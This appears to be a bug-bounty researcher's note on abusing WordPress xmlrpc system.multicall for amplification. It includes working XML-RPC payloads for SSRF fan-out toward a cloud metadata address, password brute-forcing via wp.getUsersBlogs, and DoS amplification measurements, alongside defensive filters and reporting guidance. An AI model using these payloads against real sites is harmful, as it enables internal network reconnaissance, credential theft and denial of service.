---
type: pattern
title: Pattern - WordPress xmlrpc system.multicall SSRF Amplification
tags: [pattern, cwe-918, ssrf, amplification, dos, wordpress, xmlrpc, bb-pattern]
status: verified
first_measured: 2026-04-23
severity: P3-P4 (SSRF) + P4 (DoS amplifier)
---

# Pattern - WordPress xmlrpc `system.multicall` SSRF + 24x DoS Amplification

## TL;DR

WordPress's `xmlrpc.php` exposes `system.multicall` — a batch primitive that accepts N method calls in one HTTP request and returns N responses. Default WP has **no server-side N-cap**. Measured 24× amplification with N=500 (92 KB request → 2.24 MB response in 1.88s) on a live target. Chained with `pingback.ping` this yields:

- **Reflected SSRF amplification**: 1 POST → 500+ outbound TCP SYN from server's egress IP
- **Brute-force amplification**: 50-100 credential attempts per request, bypassing per-request rate limits (well-documented pattern)
- **Internal port scan**: fanned-out timing oracle, faster than serial `pingback.ping`

## Root cause

`xmlrpc.php` is WordPress-core functionality. `system.multicall` is defined in IXR_Server as:

```php
public function multiCall($methodcalls) {
    foreach ($methodcalls as $call) {
        // executes each RPC; no limit on array length
        $result[] = $this->call($methodname, $params);
    }
    return $result;
}
```

There is no count cap, no size cap, no rate-limit, no auth requirement by default (WordPress ≤ 6.6.5 confirmed; behavior likely identical in later versions).

## Measurement

### Setup (non-destructive)

Use `system.listMethods` as the inner call — it's inert (no outbound). Do NOT pair with `pingback.ping` against a real 3rd-party target as that's DDoS testing.

```xml
<methodCall>
  <methodName>system.multicall</methodName>
  <params><param><value><array><data>
    <!-- repeat N times: -->
    <value><struct>
      <member><name>methodName</name><value>system.listMethods</value></member>
      <member><name>params</name><value><array><data></data></array></value></member>
    </struct></value>
  </data></array></value></param></params>
</methodCall>
```

### Results (target-wp.example.com, WP 6.6.5, generic)

| N | Request size | Response size | Ratio | Time |
|---|-------------:|--------------:|------:|-----:|
| 1 | ~400 B | 5.4 KB | 13.5× | 0.15s |
| 50 | ~10 KB | 240 KB | 24× | 0.8s |
| 500 | **92 KB** | **2.24 MB** | **24.4×** | **1.88s** |

No N-cap observed up to 500. Didn't push higher (ethics + bandwidth).

## Exploitation patterns

### 1. SSRF fan-out (paired with `pingback.ping`)

```xml
<!-- Inside system.multicall, each entry: -->
<value><struct>
  <member><name>methodName</name><value>pingback.ping</value></member>
  <member><name>params</name><value><array><data>
    <value><string>http://169.254.169.254/computeMetadata/v1/instance/</string></value>
    <value><string>https://vuln-wp.example.com/</string></value>
  </data></array></value>
</struct></value>
```

→ fires N outbound HTTP requests from the WP server's egress. Timing differential reveals open vs closed ports / reachable vs unreachable internal hosts.

**Port scan speed**: serial pingback requires 2s-25s timeout per target (depending on port filter). Parallelized via multicall, scan 500 ports in 2s.

### 2. Credential brute-force amplification

Pair with `wp.getUsersBlogs` / `wp.getProfile` / any authenticated RPC:

```xml
<value><struct>
  <member><name>methodName</name><value>wp.getUsersBlogs</value></member>
  <member><name>params</name><value><array><data>
    <value><string>admin</string></value>
    <value><string>CANDIDATE_PASSWORD_N</string></value>
  </data></array></value>
</struct></value>
```

Run 100 password candidates per HTTP request → 100× throughput vs single request. Famous pattern in WP brute-force tooling (e.g., `wpxf`, `wpforce`).

### 3. DoS amplification

Response is 24× larger than request. An attacker with 1 Gbps up can send 1 Gbps of multicall requests → target serves 24 Gbps of responses. Combined with spoofed Host header on WP behind CDN → possible reflected DoS.

## Defenses

### Vendor-side

1. **Disable xmlrpc.php** at the webserver layer (nginx/Apache block) — simplest
2. **Disable pingback specifically**:
   ```php
   add_filter('xmlrpc_methods', function($methods) {
       unset($methods['pingback.ping']);
       unset($methods['system.multicall']);
       return $methods;
   });
   ```
3. **Rate-limit multicall N**:
   ```php
   add_filter('xmlrpc_multicall_maxcalls', function() { return 20; });
   ```
   (This filter does NOT exist by default — requires custom implementation)
4. **Firewall pingback egress** — block WP server from making arbitrary outbound HTTP
5. **Use WAF with xmlrpc-specific rules** (Wordfence / Cloudflare managed)

### Hunter-side (non-destructive)

When reporting this finding:
- Measure amp ratio with `system.listMethods` (inert)
- Note the N limit you tested (200 / 500), never the unbounded claim
- Chain with `pingback.ping → origin-IP leak + internal network recon` for highest impact
- Do NOT DDoS a real 3rd party even to prove the primitive

## Pre-submit checklist

- [ ] Confirmed xmlrpc.php returns 200 on GET (alive) and accepts `system.multicall` POST
- [ ] Measured amp ratio on inert method (no outbound triggered)
- [ ] Chained with `pingback.ping` to prove SSRF primitive still works
- [ ] Tested N=50 and N=200 to show no server-side cap
- [ ] Captured full request + response in raw files
- [ ] CVSS score honest (Medium SSRF, Medium DoS amp — don't claim Critical without chain)

## Case studies

- **[Target] WordPress-based subdomain (2026-04-23)** — a live finding where this was upgraded from theoretical to confirmed via measured amplification.
- Historical: Wordfence / Sucuri blog posts document the brute-force use case going back to 2014.
- Ty Miller's 2014 "xmlrpc.php amplification attacks" talk (BSides Perth) was the original measurement.

## Related

- [[Pattern - SSRF Filter Bypass]] — companion for WP's port-filter bypass tricks
- [[Pattern - Internal IP Disclosure via Gateway]] — pingback leaks origin IP via X-Pingback-Forwarded-For
- First target where a 24x amp primitive was measured in production
